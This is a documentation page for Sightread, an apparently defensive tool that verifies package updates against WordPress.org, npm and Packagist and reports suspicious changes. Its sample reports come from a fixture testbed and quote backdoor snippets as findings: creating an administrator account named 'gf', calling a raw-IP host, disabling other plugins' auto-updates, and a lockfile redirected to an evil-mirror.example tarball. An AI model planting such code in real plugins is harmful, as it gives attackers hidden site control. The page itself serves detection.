Sightread diffs bytes only after they match what the source publishes. What that proves differs from one source to the next, so every report says exactly what "verified" meant for each side of each update. It never says "verified as safe". This page covers each source, what Sightread checks, what it can and can't prove and how to review packages that have no official source.

The examples on this page come from Sightread's testbed, a fixture registry on 127.0.0.1 that plays WordPress.org, Packagist, GitHub and npm with packages modelled on real incidents. Fixture names start with a scenario ID (`b17-tamper`, `acme/lib`).

## What "verified" means

| Source | Verified by | What it proves | Partial? |
|---|---|---|---|
| WordPress.org plugins | `checksums`: every file matches WordPress.org's per-file SHA-256 | the copy was not changed on the way; both come from WordPress.org, so not what the author intended | no |
| WordPress.org themes | `tls`: downloaded over TLS from downloads.wordpress.org | where it came from; WordPress.org publishes no theme checksums | no |
| WordPress.org themes with `--svn-check` | `svn`: every file matches themes.svn.wordpress.org | the zip matches the theme's own repository | no |
| npm | `signature`: SHA-512 equals `dist.integrity` and your lockfile; the registry's ECDSA signature verifies with a key pinned in the build | the registry published it; not that the content is harmless | no |
| npm, private registry | `integrity`: SHA-512 matches, no registry signature to check | the registry served what it lists | no |
| Composer | `shasum`: the archive's SHA-1 equals Packagist's | the archive Packagist lists | no |
| Composer | `commit`: the archive is pinned to the commit in `dist.reference`, which must equal your `composer.lock` | the code is that commit; Packagist publishes no archive hash for most packages | no |
| A local zip, tgz or folder | `none` | nothing to check it against | yes: UNVERIFIED |
| Any | `failed`: a published hash doesn't match | someone changed the bytes, or the release was edited | never partial: the critical finding `integrity-mismatch` |

The terminal prints it on the `▸ Integrity` line, the JSON in `from.verified`, `to.verified` and the sentence in `from.method` and `to.method`.

## WordPress.org plugins

Metadata comes from `api.wordpress.org`, the zip from `downloads.wordpress.org` and per-file checksums from `downloads.wordpress.org/plugin-checksums/<slug>/<version>.json`. An extra, missing or changed file is a mismatch, except `readme.txt`, which WordPress.org rebuilds after a release (that's noted, not flagged).

```text
  ▸ Installed     2.6.7 in wp-content/plugins/b01-widget · matches
                  wordpress.org ✓
  ▸ Candidate     2.6.8 · released 2026-10-28 · latest
  ▸ Integrity     both versions: matches WordPress.org's own checksums
                  (both come from WordPress.org, so this proves the copy
                  was not changed on the way, not what the author
                  intended) ✓
  ▸ Publisher     changed: wponlinesupport → essentialplugin
```

`matches wordpress.org ✓` on the Installed line means the copy on disk was compared with WordPress.org's copy of the installed version too. A file you edited there is the info finding `local-drift`, which names the files and says that updating will overwrite them. Installed themes are compared with the release zip of their version the same way.

### When the bytes don't match

The fixture registry serves a changed zip for `b17-tamper` 1.0.1:

```text
$ rhythm sightread plugin b17-tamper --path projects/wp
reviewing 1 of 1: b17-tamper 1.0.0 → 1.0.1

  ♪ rhythm sightread 1.0.0  wp-plugin b17-tamper  1.0.0 → 1.0.1
  ────────────────────────────────────────────────────────────────────────
  Read-only. Sightread changes nothing on your site and never runs the
  code it downloads.

  ▸ Installed     1.0.0 in wp-content/plugins/b17-tamper · matches
                  wordpress.org ✓
  ▸ Candidate     1.0.1 · released 2025-10-28 · latest
  ▸ Integrity     1.0.0: matches WordPress.org's own checksums (both come
                  from WordPress.org, so this proves the copy was not
                  changed on the way, not what the author intended);
                  1.0.1: does not match WordPress.org's own checksums ✗
  ▸ Publisher     unchanged (vendor)
  ▸ Diff          1 file changed, 1 added · +4 −1 lines · 47 B → 129 B
  ▸ Changelog     none for this version

  CRITICAL  1 ────────────────────────────────────────────────────────────

 ▌  CRITICAL   Archive does not match the published hash    b17-tamper.php
 ▌             Archive does not match wordpress.org checksums: 1 file
 ▌             differs (b17-tamper.php)
 ▌             → Someone between you and wordpress.org changed it, or the
 ▌               release was edited; don't install this copy.

 ╭──────────────────────────────────────────────────────────────────────╮
 │  VERDICT                                                       HOLD  │
 │  ■ 1 critical                                                        │
 │  Sightread reports what changed. It does not judge intent.           │
 ╰──────────────────────────────────────────────────────────────────────╯
```

An integrity mismatch is a finding, never an error: it exits `1` under `--fail-on`, `--allow-partial` doesn't pass it and it can never be ignored, allowed or lowered. `allow` refuses the version.

### Who published it

`owner-change` compares the readme's `Contributors`, the plugin information's contributors, author and author profile and the committer of the SVN release tag (one WebDAV request to `plugins.svn.wordpress.org/<slug>/tags/<version>/`). An older version takes its contributors from its own readme and its publisher from its own SVN tag. A WordPress.org takeover is named as such:

```text
 ▌  HIGH       New owner or publisher
 ▌             WordPress.org took over this plugin. Contributors before:
 ▌             none listed; now: wordpressdotorg; published by
 ▌             wordpressdotorg
 ▌             → Read this release closely. The people behind it changed.
```

WordPress.org shows contributors and committers, not sales. A transfer that keeps the same account is invisible.

## WordPress.org themes

WordPress.org publishes no theme checksums. By default a theme is verified by TLS alone, which doesn't make a run partial; the report says it plainly:

```text
  ▸ Integrity     both versions: downloaded over TLS from WordPress.org;
                  WordPress.org publishes no theme checksums ✓
```

`--svn-check` fetches every file from `themes.svn.wordpress.org/<slug>/<version>/` and compares it with the zip. It's one request per file, so it's opt-in (config `svn_check: true`); the result is cached and reused by later runs.

```text
$ rhythm sightread theme b09-theme --path projects/wp --svn-check
...
  ▸ Integrity     both versions: every file matches
                  themes.svn.wordpress.org ✓
```

## npm

Versions come from the abbreviated packument, scripts, publisher and provenance from each version's document, the tarball from `dist.tarball`. The tarball's SHA-512 must equal the registry's `dist.integrity` and your lockfile's `integrity`. The registry's ECDSA signature over `<name>@<version>:<integrity>` must verify with a key from `registry.npmjs.org/-/npm/v1/keys` that is also in the set pinned in the build. An unknown key is refused; `rhythm sightread doctor` checks the keys.

```text
  ▸ Integrity     both versions: SHA-512 matches dist.integrity and the
                  registry signature verifies with a pinned npm key (this
                  proves the registry published it, not that the content
                  is harmless) ✓
```

Provenance is checked too. A release that loses the provenance its predecessor had is a high finding:

```text
 ▌  HIGH       Release lost its build provenance
 ▌             1.0.0 was published with slsa provenance; 1.0.1 has none
 ▌             → Hold the update until the maintainers confirm they
 ▌               published it.
```

A signature or provenance proves who published and from which workflow, not that the content is harmless: a worm that publishes from a hijacked CI can carry valid provenance.

A lockfile `resolved` URL is never fetched. When it leaves the registry, that's the finding `lockfile-source-change`:

```text
 ▌  HIGH       Lockfile entry moved off the registry
 ▌             projects/changes/b14/head/package-lock.json:8
 ▌             the lock entry moved from the registry to a tarball URL:
 ▌             https://evil-mirror.example/fetchkit-1.2.1.tgz
 ▌             → Find out who moved this entry off the registry before
 ▌               merging.
```

## Composer

Metadata comes from `repo.packagist.org/p2/` (and `~dev`), maintainers from `packagist.org`. The archive is fetched from `dist.url`, usually `api.github.com` redirecting to `codeload.github.com`. When Packagist lists a `dist.shasum`, the archive must match it. Most packages have none, so the archive is pinned to `dist.reference`: the zip's top folder must name that commit and your `composer.lock` must record the same one.

```text
$ rhythm sightread composer acme/commit --path projects/wp
...
  ▸ Installed     1.0.0 in composer.lock:7
  ▸ Candidate     1.1.0 · released 2025-10-28 · latest
  ▸ Integrity     1.0.0: pinned to commit aaaa111; Packagist publishes no
                  archive hash for this package; 1.1.0: pinned to commit
                  dddd444; Packagist publishes no archive hash for this
                  package ✓
```

When the commit your lockfile recorded for a version differs from the one Packagist lists now, the tag moved. That's `version-republished`, even when the version is the one you have:

```text
$ rhythm sightread composer acme/lib --path projects/wp
reviewing 1 of 1: acme/lib 1.5.0 → 1.5.0
...
 ▌  CRITICAL   Same version, different bytes than the lockfile recorded
 ▌             composer.lock:6
 ▌             1.5.0: the lockfile pins commit aaaa111bbbb2, Packagist now
 ▌             points it at dddd444eeee5
 ▌             → Keep the copy you have. The same version should never
 ▌               change its bytes.
```

GitHub's API allows 60 requests an hour without a token. Set `GITHUB_TOKEN` for Composer projects; it goes only to api.github.com, never across the redirect to codeload.

## OSV

For public npm and Packagist packages Sightread asks `api.osv.dev` whether the candidate has a `MAL-` record (`known-malicious`, critical) or an advisory it doesn't fix (`known-vulnerable`, high). An advisory the candidate fixes is info. Private names are never sent. `--no-osv` or config `osv: false` turns it off. WordPress plugin advisories stay with [Tuner](Tuner-Known-Vulnerabilities).

## Local files

A premium plugin, a vendor download or a private build has no official source. Give it as a zip, tgz or folder: `--to-file` for the candidate, `--from-file` for the installed version. A local side is `verified: none`, so the update is UNVERIFIED and isn't diffed unless you pass `--allow-unverified`:

```text
$ rhythm sightread plugin b22-premium --from-file ../zips/b22-premium-2.8.0.zip --to-file ../zips/b22-premium-2.8.1.zip --allow-unverified
reviewing 1 of 1: b22-premium local → local

  ♪ rhythm sightread 1.0.0  wp-plugin b22-premium  2.8.0 → 2.8.1
  ────────────────────────────────────────────────────────────────────────
  Read-only. Sightread changes nothing on your site and never runs the
  code it downloads.

  ▸ Installed     2.8.0
  ▸ Candidate     2.8.1
  ▸ Integrity     both versions: local file; nothing to check it against
  ▸ Publisher     not known
  ▸ Diff          1 file changed, 1 added · +6 −1 lines · 103 B → 394 B
  ▸ Changelog     none for this version

  HIGH  5 ────────────────────────────────────────────────────────────────

 ▌  HIGH       Creates an administrator account                admin.php:2
 ▌             wp_insert_user(array('user_login'=>'gf','role'=>'administra
 ▌             tor'));
 ▌             → Hold the update. Check the site's users for accounts you
 ▌               don't know.

 ▌  HIGH       Contacts a new domain                           admin.php:4
 ▌             raw-ip host 203.0.113.52:
 ▌             wp_remote_get('https://203.0.113.52/c');
 ▌             → Find out who runs this host before updating.
...
 ▌  HIGH       Blocks updates of other plugins or themes       admin.php:3
 ▌             add_filter('auto_update_plugin','__return_false');
 ▌             likely: a heuristic, not an exact pattern
 ▌             → Hold the update. It stops other packages from updating.
...
 ╭──────────────────────────────────────────────────────────────────────╮
 │  VERDICT                               UNVERIFIED (would be REVIEW)  │
 │  Not verified: its integrity could not be checked.                   │
 │  ■ 5 high   ■ 1 medium                                               │
 │  Incomplete review: 1 update couldn't be verified.                   │
 │  Sightread reports what changed. It does not judge intent.           │
 ╰──────────────────────────────────────────────────────────────────────╯
```

The verdict stays UNVERIFIED, so `--fail-on` treats the update as one it couldn't check (exit 3 unless `--allow-unverified`). `(would be REVIEW)` says what the findings alone would make it: here, high findings and no critical one. With a critical finding it reads `UNVERIFIED (would be HOLD)`.

A local side is named by the version its files declare: the plugin's `Version:` header, a theme's `style.css`, or `version` in `package.json` or `composer.json`. Without one it's `local`. A local copy can't be allowed, since allow records a published version.

Without `--allow-unverified` the update isn't diffed and the verdict box says why:

```text
 ╭──────────────────────────────────────────────────────────────────────╮
 │  VERDICT                                                 UNVERIFIED  │
 │  Not verified: couldn't verify b22-premium 2.8.0: installed copy.    │
 │  Not diffed; --allow-unverified reviews it anyway.                   │
 │  Incomplete review: 1 update couldn't be verified.                   │
 │  Sightread reports what changed. It does not judge intent.           │
 ╰──────────────────────────────────────────────────────────────────────╯
```

## Not checked

A package Sightread can't review is listed under Not checked with a reason and a hint. It makes the run incomplete:

| Reason | Text | Hint |
|---|---|---|
| `no-header` | plugin folder has no Plugin Name header | check the folder by hand or remove it |
| `not-wporg` | not on WordPress.org (an `Update URI`, no files match the WordPress.org copy, or the slug is unknown) | give the vendor's zip with `--to-file` |
| `private` | private registry or repository | set the registry in `.sightread/config.yaml` sources |
| `vcs` | git, path or URL dependency | Sightread reviews registry releases only |
| `tarball` | tarball from a URL outside the registries Sightread knows | Sightread reviews registry releases only; set SIGHTREAD_NPM_REGISTRY or sources.npm.registry when the URL is your mirror |
| `unsupported-lock` | `bun.lockb` and other unreadable lockfiles | write a text lockfile |
| `fetch-failed` | couldn't download | run again; `-v` shows the request |
| `too-large` | over `--max-size` | raise `--max-size` |
| `mu-plugin` | must-use plugins and drop-ins have no update channel | informational, never makes a run partial |
| `core` | WordPress core is out of scope in v1 | informational, never makes a run partial |

```text
  NOT CHECKED  2 ─────────────────────────────────────────────────────────

    b22-premium 2.8.0 (wp-plugin): not on WordPress.org
      → give the vendor's zip with --to-file
    wordpress 6.8.3: WordPress core is out of scope in v1
      → WordPress core updates come signed from WordPress.org
```

## Mirrors and private registries

Configure mirrors and private registries in the config's `sources` (see [Configuration](Sightread-Configuration#sources)) or with the `SIGHTREAD_*` variables. Every mirror URL must be `https://`; `http://` is accepted only on 127.0.0.1, `::1` or `localhost`. A package your lockfile resolved from the configured npm mirror is reviewed like a registry package. Tokens come from the environment only: `SIGHTREAD_NPM_TOKEN_<SCOPE>` for an npm scope and `COMPOSER_AUTH` for Composer repositories, each sent only to its own host.

---
<sub>← [Allow and baseline](Sightread-Allow-And-Baseline) · [Home](Home) · [With Soundcheck and Roadie](Sightread-With-Soundcheck) →</sub>
